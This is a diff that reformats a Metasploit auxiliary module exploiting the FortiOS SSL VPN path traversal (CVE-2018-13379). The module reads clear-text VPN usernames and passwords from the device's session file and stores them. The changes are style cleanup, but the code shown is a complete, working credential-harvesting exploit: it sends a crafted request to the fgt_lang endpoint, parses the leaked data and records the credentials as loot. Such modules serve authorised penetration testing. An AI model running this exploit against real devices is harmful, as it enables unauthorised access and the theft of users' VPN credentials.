@@ -1,3 +1,5 @@
+# frozen_string_literal: true
+
 ##
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -13,11 +15,15 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(info,
       'Name' => 'FortiOS Path Traversal Leak Credentials',
       'Description' => %q{
-        FortiOS system file leak through SSL VPN via specially crafted HTTP resource requests.
-        A path traversal vulnerability in the FortiOS SSL VPN web portal may allow an unauthenticated
-        attacker to download FortiOS system files through specially crafted HTTP resource requests.
-        This module reads logins and passwords in clear text from the `/dev/cmdb/sslvpn_websession` file.
-        This vulnerability affects (FortiOS 5.4.6 to 5.4.12, FortiOS 5.6.3 to 5.6.7 and FortiOS 6.0.0 to 6.0.4).
+        FortiOS system file leak through SSL VPN via specially crafted HTTP
+        resource requests. A path traversal vulnerability in the FortiOS SSL
+        VPN web portal may allow an unauthenticated attacker to download FortiOS
+        system files through specially crafted HTTP resource requests.
+
+        This module reads logins and passwords in clear text from
+        the `/dev/cmdb/sslvpn_websession` file. This vulnerability affects
+        (FortiOS 5.4.6 to 5.4.12, FortiOS 5.6.3 to 5.6.7 and FortiOS 6.0.0
+        to 6.0.4).
       },
       'References' => [
         ['CVE', '2018-13379'],
@@ -33,11 +39,11 @@ class MetasploitModule < Msf::Auxiliary
       'DefaultOptions' => {
         'RPORT' => 443,
         'SSL' => true
-      },
+      }
     ))
 
     register_options([
-      OptEnum.new('DUMP_FORMAT', [true,  'Dump format.', 'raw', ['raw', 'ascii']]),
+      OptEnum.new('DUMP_FORMAT', [true, 'Dump format.', 'raw', ['raw', 'ascii']]),
       OptBool.new('STORE_CRED', [false, 'Store credential into the database.', true]),
       OptString.new('TARGETURI', [true, 'Base path', '/remote'])
     ])
@@ -48,16 +54,17 @@ class MetasploitModule < Msf::Auxiliary
 
     uri = normalize_uri(target_uri.path, 'fgt_lang')
     begin
-      response = send_request_cgi({
-        'method' => 'GET',
-        'uri' => uri,
-        'vars_get' => {
-          'lang' => payload
+      response = send_request_cgi(
+        {
+          'method' => 'GET',
+          'uri' => uri,
+          'vars_get' => {
+            'lang' => payload
+          }
         }
-      })
-
+      )
     rescue StandardError => e
-      print_error(message("#{e.message}"))
+      print_error(message(e.message.to_s))
       return nil
     end
 
@@ -76,12 +83,12 @@ class MetasploitModule < Msf::Auxiliary
       report_vuln(
         host: @ip_address,
         name: name,
-        refs: references,
+        refs: references
       )
       return response.body if datastore['STORE_CRED'] == true
     end
 
-    return nil
+    nil
   end
 
   def message(msg)
@@ -89,48 +96,50 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def parse_config(chunk)
-    chunk = chunk.split("\x00").reject { |c| c.empty? }
+    chunk = chunk.split("\x00").reject(&:empty?)
 
-    unless chunk[1].nil? or chunk[2].nil?
-      credential = {
-        ip: @ip_address,
-        port: datastore['RPORT'],
-        service_name: @proto,
-        user: chunk[1],
-        password: chunk[2]
-      }
-    end
+    return if chunk[1].nil? || chunk[2].nil?
+
+    credential = {
+      ip: @ip_address,
+      port: datastore['RPORT'],
+      service_name: @proto,
+      user: chunk[1],
+      password: chunk[2]
+    }
   end
 
   def report_creds(creds)
     creds.each do |cred|
-      cred = cred.gsub('"', '').gsub(/[{}:]/,'').split(', ').map{|h| h1,h2 = h.split('=>'); {h1 => h2}}.reduce(:merge)
+      cred = cred.gsub('"', '').gsub(/[{}:]/, '').split(', ')
+      cred = cred.map { |h| h1, h2 = h.split('=>'); { h1 => h2 } }.reduce(:merge)
+
       cred = JSON.parse(cred.to_json)
 
-      if cred && (!cred['user'].blank? && !cred['password'].blank?)
-        service_data = {
-          address: cred['ip'],
-          port: cred['port'],
-          service_name: cred['service_name'],
-          protocol: 'tcp',
-          workspace_id: myworkspace_id
-        }
+      next unless cred && (!cred['user'].blank? && !cred['password'].blank?)
 
-        credential_data = {
-          origin_type: :service,
-          module_fullname: fullname,
-          username: cred['user'],
-          private_data: cred['password'],
-          private_type: :password
-        }.merge(service_data)
+      service_data = {
+        address: cred['ip'],
+        port: cred['port'],
+        service_name: cred['service_name'],
+        protocol: 'tcp',
+        workspace_id: myworkspace_id
+      }
 
-        login_data = {
-          core: create_credential(credential_data),
-          status: Metasploit::Model::Login::Status::UNTRIED
-        }.merge(service_data)
+      credential_data = {
+        origin_type: :service,
+        module_fullname: fullname,
+        username: cred['user'],
+        private_data: cred['password'],
+        private_type: :password
+      }.merge(service_data)
 
-        create_credential_login(login_data)
-      end
+      login_data = {
+        core: create_credential(credential_data),
+        status: Metasploit::Model::Login::Status::UNTRIED
+      }.merge(service_data)
+
+      create_credential_login(login_data)
     end
   end
 
@@ -145,33 +154,32 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    case datastore['DUMP_FORMAT']
+    loot_data = case datastore['DUMP_FORMAT']
     when /ascii/
-      loot_data = data.gsub(/[^[:print:]]/, '.')
+      data.gsub(/[^[:print:]]/, '.')
     else
-      loot_data = data
+      data
     end
     loot_path = store_loot('', 'text/plain', @ip_address, loot_data, '', '')
     print_good(message("File saved to #{loot_path}"))
 
     separator = "\x5F\x01"
-    if data =~ /\x5F\x00\x00\x00\x00\x01/
-      separator = "\x5F\x00\x00\x00\x00\x01"
-    end
+    separator = "\x5F\x00\x00\x00\x00\x01" if data =~ /\x5F\x00\x00\x00\x00\x01/
     data = data.split(separator)
 
     creds = []
     data.each_with_index do |chunk, index|
-      if index > 0
-        creds << "#{parse_config(chunk)}" unless chunk[0] == "\x00" or !chunk[0].ascii_only?
-      end
+      next unless index.positive?
+
+      next if chunk[0] == "\x00" || !chunk[0].ascii_only?
+
+      creds << parse_config(chunk).to_s
     end
     creds = creds.uniq
 
-    if creds.length > 0
-      print_good(message("#{creds.length} credential(s) found!"))
-      report_creds(creds)
-    end
-  end
+    return unless creds.length.positive?
 
+    print_good(message("#{creds.length} credential(s) found!"))
+    report_creds(creds)
+  end
 end
